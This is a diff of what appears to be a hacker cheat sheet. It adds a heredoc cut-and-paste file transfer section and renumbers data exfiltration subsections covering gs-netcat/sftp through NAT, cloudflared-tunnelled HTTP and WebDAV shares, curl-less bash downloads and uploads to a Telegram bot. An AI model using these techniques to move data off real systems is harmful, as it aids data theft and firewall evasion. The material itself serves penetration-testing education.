@@ -36,6 +36,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Brute Force Passwords](#bruteforce)
 1. [Data Upload/Download/Exfil](#exfil)
    1. [File Encoding/Decoding](#file-encoding)
+   1. [File transfer using cut & paste](#cut-paste)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
@@ -787,9 +788,18 @@ xxd -p </etc/issue.net
 xxd -p -r >issue.net-COPY
 ```
 
-<a id="file-transfer-screen"></a>
+<a id="cut-paste"></a>
+### 4.ii. File transfer - using cut & paste
 
-### 4.ii. File transfer - using *screen*
+Paste into a file on the remote machine (note the `<<-'__EOF__'` to not mess with tabs or $-variables).
+```sh
+cat >output.txt <<-'__EOF__'
+[...]
+__EOF__  ### Finish your cut & paste by typing __EOF__
+```
+
+<a id="file-transfer-screen"></a>
+### 4.iii. File transfer - using *screen*
 
 #### From REMOTE to LOCAL (download)
 
@@ -841,8 +851,7 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
 <a id="file-transfer-gs-netcat"></a>
-
-### 4.iii. File transfer - using gs-netcat and sftp
+### 4.iv. File transfer - using gs-netcat and sftp
 
 Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.
 
@@ -857,7 +866,7 @@ sftp -D gs-netcat                                        # Workstation
 ```
 
 <a id="http"></a>
-### 4.iv. File transfer - using HTTP
+### 4.v. File transfer - using HTTP
 
 ```sh
 ## Spawn a temporary HTTP server and share the current working directory.
@@ -870,7 +879,7 @@ cloudflared tunnel -url localhost:8080
 ```
 
 <a id="burl"></a>
-### 4.iv. File transfer without curl
+### 4.vi. File transfer without curl
 
 Using bash, download only:
 ```sh
@@ -886,7 +895,7 @@ burl() {
 ```
 
 <a id="webdav"></a>
-### 4.v. File transfer - using WebDAV
+### 4.vii. File transfer - using WebDAV
 
 On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
@@ -923,7 +932,7 @@ net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
 <a id="tg"></a>
-### 4.vi. File transfer to Telegram
+### 4.viii. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
 ```sh
